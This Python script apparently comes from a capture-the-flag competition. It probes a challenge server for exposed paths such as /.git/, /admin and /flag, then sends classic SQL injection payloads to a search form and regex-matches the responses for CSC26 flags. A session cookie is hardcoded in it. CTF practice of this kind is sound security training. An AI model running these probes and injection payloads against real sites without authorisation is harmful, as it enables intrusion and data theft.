import requests
from bs4 import BeautifulSoup
import re

base_url = "https://poiuytrewqas-csc26.cybersecuritychallenge.al"
session = requests.Session()
session.cookies.set('session', 'eyJ1c2VyIjoiYWxwZXRnIn0.aXymyw.GBEYMO9Mn9kpHr1J86YGyGs4CsE')

# Try accessing common locations
endpoints = [
    "/static/js/",
    "/static/",
    "/static/css/retro.css",
    "/robots.txt",
    "/.git/",
    "/flag",
    "/flag.txt",
    "/admin",
    "/api",
    "/search?q=test",
]

for endpoint in endpoints:
    url = f"{base_url}{endpoint}"
    print(f"\n[*] Trying: {url}")
    response = session.get(url)
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        print(f"    Content preview: {response.text[:200]}")
        # Look for flag
        if re.search(r'CSC26\{[^}]+\}', response.text, re.IGNORECASE):
            print(f"\n🚩 FLAG FOUND!")
            flags = re.findall(r'CSC26\{[^}]+\}', response.text, re.IGNORECASE)
            print(f"🚩 {flags}")

# Try SQL injection in search
print("\n\n[+] Testing SQL injection payloads...")
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
]

search_url = f"{base_url}/search"
for payload in sql_payloads:
    print(f"\n[*] Payload: {payload}")
    response = session.post(search_url, data={"q": payload})
    soup = BeautifulSoup(response.text, 'html.parser')
    main = soup.find('main')
    if main:
        text = main.get_text()
        print(f"    Result: {text[:200]}")
        if "CSC26{" in text:
            print(f"\n🚩 FLAG FOUND: {re.findall(r'CSC26{[^}]+}', text)}")
